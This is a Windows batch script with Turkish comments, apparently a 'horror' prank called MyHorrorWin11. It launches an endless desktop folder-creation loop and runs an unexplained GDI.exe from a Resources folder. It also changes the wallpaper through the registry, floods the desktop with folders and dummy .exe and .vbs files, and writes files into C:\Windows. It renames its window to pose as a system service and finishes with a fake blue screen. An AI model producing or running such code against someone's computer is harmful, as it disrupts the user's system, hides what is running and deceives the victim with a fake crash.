@echo off
setlocal EnableDelayedExpansion

title MyHorrorWin11 - SISTEM KONTROL ALTINDA...
color 0a
cls

echo =============================================
echo      MyHorrorWin11 AKTIF - WINDOWS 11 KORKU
echo =============================================
echo.

:: Masaüstü yolu (çoğu Windows'ta çalışır)
set "Desktop=%USERPROFILE%\Desktop"
set "Resources=%Desktop%\Resources"

:: 1. Sonsuz klasör döngüsü (Dead__31AQ vb.) - bunu ayrı bir pencerede başlatıyoruz ki script devam etsin
start /min cmd /c "(goto) 2>nul & :x md "%Desktop%\Dead__31AQ_%random%" md "%Desktop%\Dead__67AQ_%random%" md "%Desktop%\Dead__61AQ_%random%" & goto :x"

:: 2. Resources klasöründeki GDI.exe'yi başlat (eğer varsa)
if exist "%Resources%\GDI.exe" (
    start "" "%Resources%\GDI.exe"
) else (
    echo [UYARI] Resources\GDI.exe bulunamadi...
)

:: 3. Masaüstü arka planını kel.jpg yap (Windows 10/11'de reg + rundll32 yöntemi)
if exist "%Resources%\kel.jpg" (
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%Resources%\kel.jpg" /f >nul 2>&1
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul 2>&1
    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1,true >nul 2>&1
    echo Arka plan degistirildi (kel.jpg).
) else (
    echo [UYARI] Resources\kel.jpg bulunamadi...
)

:: 4. Masaüstüne 50 klasör
for /l %%i in (1,1,50) do (
    md "%Desktop%\Korku_%%i" 2>nul
)

:: 5. Masaüstüne 20 tane g.exe (boş dosya olarak)
for /l %%i in (1,1,20) do (
    type nul > "%Desktop%\g_%%i.exe"
)

:: 6. Masaüstüne 10 tane r.vbs (basit bir VBS koduyla - sonsuz mesaj kutusu prank)
for /l %%i in (1,1,10) do (
    > "%Desktop%\r_%%i.vbs" echo MsgBox "MyHorrorWin11 seni izliyor... ZOOOORT!", vbCritical, "KORKU"
)

:: 7. Kendisini "Crystal process" gibi göstermek (sadece isim değiştirme - gerçek process ismi batch kalır)
title Crystal Process - Sistem Servisi

echo.
echo Tum islemler baslatildi...
echo.
echo SIMDI KORKU BASLIYOR...
timeout /t 4 >nul

:: 8. C:\Windows\TrMd klasörü + içindeki dosyalar (boş dosyalar)
set "TrMd=C:\Windows\TrMd"
if not exist "%TrMd%" md "%TrMd%" 2>nul

for /l %%i in (1,1,99) do type nul > "%TrMd%\h_%%i.exe" 2>nul
for /l %%i in (1,1,15) do type nul > "%TrMd%\g_%%i.vbs" 2>nul
for /l %%i in (1,1,35) do type nul > "%TrMd%\j_%%i.bat" 2>nul

echo TrMd klasoru ve icindeki dosyalar olusturuldu.

:: 9. Script kapanınca sahte mavi ekran göstermek için son kısım
echo.
echo Bu pencereyi kapatirsan... KORKUNC bir sey olacak...
pause >nul

:: Sahte BSOD (tam ekran mavi ekran prank)
cls
color 1f
mode con: cols=100 lines=30
echo.
echo A problem has been detected and Windows has been shut down to prevent
echo damage to your computer.
echo.
echo DRIVER_IRQL_NOT_LESS_OR_EQUAL
echo.
echo If this is the first time you've seen this stop error screen,
echo restart your computer, If this screen appears again, follow
echo these steps:
echo.
echo Technical information:
echo.
echo *** STOP: 0x000000D1 (0x0000000C, 0x00000002, 0x00000000, 0xF86B5A89)
echo.
echo *** nv4_disp.dll - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb
echo.
echo.
echo Press any key to continue . . . (aslında hicbir sey olmayacak)
pause >nul
exit
